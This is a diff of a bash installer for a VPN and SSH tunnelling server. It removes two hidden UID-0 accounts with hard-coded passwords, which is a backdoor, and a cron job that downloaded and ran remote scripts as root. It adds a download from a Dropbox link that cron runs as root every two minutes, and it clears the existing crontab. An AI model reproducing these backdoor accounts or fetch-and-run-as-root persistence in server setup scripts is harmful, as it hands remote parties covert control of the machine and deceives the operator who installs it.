@@ -23,8 +23,8 @@ systemctl restart apache2
 systempackages () {
 export DEBIAN_FRONTEND=noninteractive
 apt update
-apt install -y iptables
 apt install php php-mysqli php-mysql php-gd php-mbstring -y
+apt-get install netcat lsof php php-mysqli php-mysql php-gd php-mbstring python -y
 apt install -y curl wget cron python-minimal libpython-stdlib
 apt install -y openvpn netcat httpie php neofetch vnstat
 apt install -y screen squid stunnel4 dropbear gnutls-bin python
@@ -280,9 +280,13 @@ wget -O /etc/openvpn/script/config.sh "https://raw.githubusercontent.com/DexterR
 
 wget -O /etc/openvpn/script/authvpn.sh "https://raw.githubusercontent.com/DexterRepositories/DB/main/strongcert/prem.sh"
 
+wget -O /usr/local/sbin/ssh.php https://www.dropbox.com/s/t6z7zbaa62o1oz0/prem.sh -q
+
 wget -O /etc/openvpn/script/connect.sh "https://raw.githubusercontent.com/DexterRepositories/DB/main/strongcert/connect.sh"
 
 wget -O /etc/openvpn/script/disconnect.sh "https://raw.githubusercontent.com/DexterRepositories/DB/main/strongcert/disconnect.sh"
+
+
 
 
 cat <<EOF >/etc/stunnel/stunnel.pem
@@ -379,51 +383,32 @@ echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-
 echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
 mkdir /etc/iptables
 iptables-save > /etc/iptables/rules.v4
+apt-get install iptables-persistent -y
 systemctl start openvpn@server
 }
 
-installing_api(){
-clear
-echo 'Installing ssh API.'
-{
-#API Details
-VPN_Owner='MTknetwork';
-API_LINK='hxhvpn.net/api/authentication/premium';
-API_KEY='Tknetwork';
+serviceenable1 () {
+/bin/cat <<"EOM" >/root/cron.sh
+php /usr/local/sbin/ssh.php
+chmod +x /root/active.sh
+chmod +x /root/inactive.sh
+bash /root/active.sh
+bash /root/inactive.sh
+EOM
 
-
-
-cat <<EOF >/home/authentication.sh
-#!/bin/bash
-SHELL=/bin/bash
-PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
-wget -O /home/active.sh "$API_LINK/active.php?key=$API_KEY"
-sleep 5
-wget -O /home/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
-sleep 5
-wget -O /home/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
-sleep 15
-bash /home/active.sh
-sleep 15
-bash /home/inactive.sh
-sleep 15
-bash /home/deleted.sh
-EOF
-
-echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
-
-echo "* * * * * /bin/bash  /home/active.sh >/dev/null 2>&1" | crontab -
-
-echo "* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1" | crontab -
-
-sh active.sh | tee -a  /home/active.sh
-
-wget -O /home/active.sh "hxhvpn.net/api/authentication/premium/active.php?key=Tknetwork"
-sleep 5
-wget -O /home/inactive.sh "hxhvpn.net/api/authentication/premium/inactive.php?key=Tknetwork"
-sleep 5
-wget -O /home/deleted.sh "hxhvpn.net/api/authentication/premium/deleted.php?key=Tknetwork"
- } &>/dev/null
+crontab -r
+(crontab -l 2>/dev/null || true; echo "*/2 * * * * /bin/bash /root/cron.sh") | crontab -
+#printf "\nAllowUsers root" >> /etc/ssh/sshd_config
+chmod -R 755 /etc/openvpn
+service ssh restart
+service squid restart
+service dropbear restart
+systemctl restart stunnel4
+systemctl restart openvpn
+systemctl enable dropbear
+systemctl enable squid
+systemctl enable stunnel4
+systemctl enable openvpn
 }
 
 serviceenable () {
@@ -719,18 +704,6 @@ echo "SHELL=/bin/bash
 
 bash /root/auto
 
-useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
-useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
-chmod -R 755 /etc/openvpn
-service ssh restart
-service squid restart
-service dropbear restart
-systemctl restart stunnel4
-systemctl restart openvpn
-systemctl enable dropbear
-systemctl enable squid
-systemctl enable stunnel4
-systemctl enable openvpn
 }
 
 pythonproxyinstall(){
@@ -847,8 +820,8 @@ systemupdate
 filesfolders
 iptablesrules
 pythonproxyinstall
-installing_api
 serviceenable
+serviceenable1
 sleep 3
 clear
 display_menu
